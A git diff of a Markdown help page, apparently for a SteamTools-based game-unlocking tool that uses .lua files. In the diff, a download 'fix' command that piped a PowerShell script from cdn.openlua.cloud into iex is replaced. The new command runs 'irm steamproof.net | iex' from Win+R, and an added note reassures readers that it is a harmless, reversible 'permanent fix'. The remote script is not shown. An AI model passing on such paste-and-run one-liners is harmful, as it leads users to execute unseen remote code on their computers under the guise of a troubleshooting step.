@@ -107,7 +107,7 @@ That's it! You can now buy the game.
 
 </details>
 
-## Generator (openlua.cloud)
+## Website
 
 <details>
 <summary>Why is there no zip file? Why is it just a single .lua file?</summary>
@@ -156,12 +156,12 @@ If you get a red error right after pressing Enter, use a VPN like [Proton VPN](h
 
 Retry the download a few times. If it doesn't work anyways, copy the line below:
 ```powershell
-irm -useb cdn.openlua.cloud/fix-download.ps1 | iex
+PowerShell irm steamproof.net | iex
 ```
-open PowerShell as administrator, paste the line you've copied and press Enter. Wait until the proccess finishes.
+press Win + R, paste the line you've copied and press Enter. Wait until the proccess finishes.
 
 :::note
-If you get a red error right after pressing Enter, use a VPN like [Proton VPN](https://protonvpn.com/download-windows).
+**This is a permanent fix.** Once you do this once SteamTools will start functioning like normal. No, this doesn't mean that it's going to be permanently baked into your Steam installation - you can undo the fix by running the script above again. 
 :::
 
 </details>
